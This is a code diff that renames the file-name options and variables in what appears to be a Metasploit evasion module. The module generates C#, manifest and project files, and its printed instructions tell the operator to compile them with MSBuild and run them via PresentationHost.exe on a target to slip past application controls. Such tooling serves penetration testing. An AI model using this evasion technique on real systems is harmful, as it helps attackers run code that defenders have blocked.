@@ -27,9 +27,9 @@ class MetasploitModule < Msf::Evasion
 
     register_options(
       [
-        OptString.new('FILE_ONE', [true, 'Filename for the .xaml.cs file (default: presentationhost.xaml.cs)', 'presentationhost.xaml.cs']),
-        OptString.new('FILE_TWO', [true, 'Filename for the .manifest file (default: presentationhost.manifest)', 'presentationhost.manifest']),
-        OptString.new('FILE_THREE', [true, 'Filename for the .csproj file (default: presentationhost.csproj)', 'presentationhost.csproj'])
+        OptString.new('CS_FILE', [true, 'Filename for the .xaml.cs file (default: presentationhost.xaml.cs)', 'presentationhost.xaml.cs']),
+        OptString.new('MANIFEST_FILE', [true, 'Filename for the .manifest file (default: presentationhost.manifest)', 'presentationhost.manifest']),
+        OptString.new('CSPROJ_FILE', [true, 'Filename for the .csproj file (default: presentationhost.csproj)', 'presentationhost.csproj'])
       ]
     )
 
@@ -119,13 +119,13 @@ class MetasploitModule < Msf::Evasion
       <Reference Include="System" />
       </ItemGroup>
       <ItemGroup>
-      <Compile Include="#{datastore['FILE_ONE']}">
-      <DependentUpon>#{datastore['FILE_ONE']}</DependentUpon>
+      <Compile Include="#{datastore['CS_FILE']}">
+      <DependentUpon>#{datastore['CS_FILE']}</DependentUpon>
       <SubType>Code</SubType>
       </Compile>
       </ItemGroup>
       <ItemGroup>
-      <None Include="#{datastore['FILE_TWO']}" />
+      <None Include="#{datastore['MANIFEST_FILE']}" />
       </ItemGroup>
       <Import Project="$(MSBuildToolsPath)\\Microsoft.CSharp.targets" />
       </Project>
@@ -137,27 +137,27 @@ class MetasploitModule < Msf::Evasion
   end
 
   def create_files
-    f1 = datastore['FILE_ONE'].empty? ? 'presentationhost.xaml.cs' : datastore['FILE_ONE']
+    f1 = datastore['CS_FILE'].empty? ? 'presentationhost.xaml.cs' : datastore['CS_FILE']
     f1 << '.xaml.cs' unless f1.downcase.end_with?('.xaml.cs')
-    f2 = datastore['FILE_TWO'].empty? ? 'presentationhost.manifest' : datastore['FILE_TWO']
+    f2 = datastore['MANIFEST_FILE'].empty? ? 'presentationhost.manifest' : datastore['MANIFEST_FILE']
     f2 << '.manifest' unless f2.downcase.end_with?('.manifest')
-    f3 = datastore['FILE_THREE'].empty? ? 'presentationhost.csproj' : datastore['FILE_THREE']
+    f3 = datastore['CSPROJ_FILE'].empty? ? 'presentationhost.csproj' : datastore['CSPROJ_FILE']
     f3 << '.csproj' unless f3.downcase.end_with?('.csproj')
-    file1 = presentationhost_xaml_cs
-    file2 = presentationhost_manifest
-    file3 = presentationhost_csproj
+    cs_file = presentationhost_xaml_cs
+    manifest_file = presentationhost_manifest
+    csproj_file = presentationhost_csproj
     file_format_filename(f1)
-    file_create(file1)
+    file_create(cs_file)
     file_format_filename(f2)
-    file_create(file2)
+    file_create(manifest_file)
     file_format_filename(f3)
-    file_create(file3)
+    file_create(csproj_file)
   end
 
   def instructions
-    print_status "Copy #{datastore['FILE_ONE']}, #{datastore['FILE_TWO']} and #{datastore['FILE_THREE']} to the target"
-    print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\MSBuild.exe #{datastore['FILE_THREE']}"
-    print_status "Execute using: C:\\Windows\\System32\\PresentationHost.exe [Full Path To] #{datastore['FILE_ONE'].gsub('.xaml.cs', '.xbap')}"
+    print_status "Copy #{datastore['CS_FILE']}, #{datastore['MANIFEST_FILE']} and #{datastore['CSPROJ_FILE']} to the target"
+    print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\MSBuild.exe #{datastore['CSPROJ_FILE']}"
+    print_status "Execute using: C:\\Windows\\System32\\PresentationHost.exe [Full Path To] #{datastore['CS_FILE'].gsub('.xaml.cs', '.xbap')}"
   end
 
   def run
